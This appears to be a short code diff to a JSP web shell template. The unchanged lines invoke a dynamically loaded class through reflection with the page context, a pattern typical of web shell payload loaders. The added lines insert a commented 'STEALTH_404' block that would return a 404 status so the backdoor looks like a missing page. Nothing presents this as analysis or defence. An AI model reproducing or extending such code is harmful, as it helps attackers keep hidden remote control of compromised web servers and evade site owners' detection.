@@ -60,6 +60,10 @@
                 objLoader.getClass().getMethod("equals", Object.class).invoke(objLoader, pageContext);
             } catch (Exception exRuntime) {}
         }
+    } else {
+        /* [STEALTH_404_START]
+        response.setStatus(404);
+        [STEALTH_404_END] */
     }
     ]]>
     </jsp:scriptlet>
